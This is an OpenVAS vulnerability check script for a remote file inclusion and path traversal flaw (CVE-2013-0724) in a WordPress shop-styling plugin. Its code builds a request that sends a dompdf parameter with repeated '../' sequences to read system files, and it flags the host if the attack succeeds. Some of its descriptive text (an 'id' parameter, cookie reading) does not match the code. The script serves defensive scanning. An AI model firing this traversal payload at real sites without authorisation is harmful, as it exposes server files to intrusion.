###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp-ecommerce-shop-styling_rfi_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# WordPress WP ecommerce Shop Styling 'dompdf' Remote File Inclusion Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804709");
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2013-0724");
  script_bugtraq_id(57768);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2014-07-07 12:27:51 +0530 (Mon, 07 Jul 2014)");
  script_name("WordPress WP ecommerce Shop Styling 'dompdf' Remote File Inclusion Vulnerability");

  tag_summary =
"This host is installed with WordPress WP ecommerce Shop Styling Plugin and
is prone to remote file inclusion vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Input passed via the 'id' HTTP GET parameter to /lp/index.php script is not
properly sanitised before returning to the user.";

  tag_impact =
"Successful exploitation may allow an attacker to obtain sensitive information,
which can lead to launching further attacks.

Impact Level: Application";

  tag_affected =
"WordPress WP ecommerce Shop Styling Plugin version 1.7.2, Other version may
also be affected.";

  tag_solution =
"Upgrade to version 1.8 or higher.
For updates refer to http://wordpress.org/plugins/wp-ecommerce-shop-styling";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://secunia.com/advisories/51707");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/81931");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  ## Construct the attack request
  url = dir + '/wp-content/plugins/wp-ecommerce-shop-styling'
            + '/includes/generate-pdf.php?dompdf='
            + crap(data:"../", length:9*6) + files[file];

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:http_port, url:url, check_header:TRUE, pattern:file))
  {
    security_message(http_port);
    exit(0);
  }
}
